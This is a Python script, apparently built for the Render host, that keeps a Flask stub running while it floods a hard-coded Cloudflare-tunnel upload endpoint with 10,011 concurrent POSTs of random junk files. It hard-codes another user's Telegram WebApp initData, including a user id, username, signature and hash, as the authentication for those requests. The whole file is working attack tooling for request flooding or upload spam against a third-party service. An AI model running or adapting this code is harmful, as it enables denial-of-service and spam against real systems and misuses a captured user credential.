import requests
import concurrent.futures
import random
import string
import io
import time
import os
import threading
from flask import Flask
from requests.adapters import HTTPAdapter

# --- НАСТРОЙКИ (Берутся из Environment Variables на Render) ---
# Если переменной нет в настройках Render, используется значение по умолчанию
TARGET_URL = os.environ.get('TARGET_URL', 'https://criterion-bearing-proven-beam.trycloudflare.com/upload_secret_key_matebal244')
INIT_DATA = os.environ.get('INIT_DATA', "query_id=AAFeDzxKAAAAAF4PPEqNrM_b&user=%7B%22id%22%3A1245450078%2C%22first_name%22%3A%22%D1%82%D1%80%D0%BE%D0%BA%D0%B5%D1%80%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22trackernn%22%2C%22language_code%22%3A%22ru%22%2C%22is_premium%22%3Atrue%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2FBayu7V8HyvKkO4M9_KiqwdzaKhCVG229ZmXFUzlFtnA.svg%22%7D&auth_date=1769012242&signature=o18-IrRrxlh-1y-iY_Ak_mAVWzF81bBmYcZs8Uz1x7iPPTueKGsnsQ5rRyGRNsvQI-gDxUyVz0a12ScBWVWkBg&hash=5b75466e0b212dbd31ea4fc15e354f947ab819cde758192cea9e57dc43c16ce8")

TOTAL_REQUESTS = 10011
MAX_WORKERS = 20

# Инициализация Flask для Render
app = Flask(__name__)

# ----------------- ФУНКЦИИ ГЕНЕРАЦИИ -----------------

def generate_filename():
    random_digits = random.randint(1000, 9999999)
    return f"marselegendandtrackerlegend_{random_digits}.json"

def generate_content(length=1000):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def send_task(session):
    filename = generate_filename()
    content = generate_content(10010)
    file_obj = io.BytesIO(content.encode('utf-8'))

    files = {'file': (filename, file_obj, 'text/plain')}
    payload = {"initData": INIT_DATA}

    try:
        resp = session.post(TARGET_URL, files=files, data=payload, timeout=15)
        try:
            json_resp = resp.json()
        except ValueError:
            return filename, False, f"Not JSON (Status {resp.status_code})"

        if resp.status_code == 200 and json_resp.get("status") == "ok":
            return filename, True, "OK"
        else:
            return filename, False, f"Ответ: {json_resp}"

    except Exception as e:
        return filename, False, f"Сбой сети: {e}"

# ----------------- ОСНОВНАЯ ЛОГИКА (В ФОНЕ) -----------------

def worker_thread():
    """Функция, которая будет работать в фоне, пока Flask держит сервер"""
    print(f"--- ЗАПУСК WORKER ---")
    print(f"URL: {TARGET_URL}")
    print("-" * 60)

    session = requests.Session()
    adapter = HTTPAdapter(pool_connections=MAX_WORKERS, pool_maxsize=MAX_WORKERS)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    success_count = 0
    fail_count = 0

    # Используем ThreadPoolExecutor
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(send_task, session) for _ in range(TOTAL_REQUESTS)]

        for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
            filename, is_success, message = future.result()
            prefix = f"[{i}/{TOTAL_REQUESTS}]"

            if is_success:
                success_count += 1
                # print (flush=True) важно для логов Render
                print(f"{prefix} [+] {filename} -> УСПЕШНО", flush=True)
            else:
                fail_count += 1
                print(f"{prefix} [x] {filename} -> ОШИБКА -> {message}", flush=True)

    print("-" * 60)
    print(f"ИТОГ: Успешно: {success_count} | Ошибок: {fail_count}", flush=True)
    print("Работа завершена. Сервер продолжает работать (для Render).")

# ----------------- FLASK СЕРВЕР -----------------

@app.route('/')
def home():
    return "Worker is running in background..."

def start_background_worker():
    thread = threading.Thread(target=worker_thread)
    thread.daemon = True
    thread.start()

if __name__ == "__main__":
    # Запускаем нашу задачу в отдельном потоке
    start_background_worker()
    
    # Запускаем веб-сервер на порту, который выдаст Render
    port = int(os.environ.get("PORT", 10000))
    # host='0.0.0.0' обязательно для доступа извне
    app.run(host='0.0.0.0', port=port)
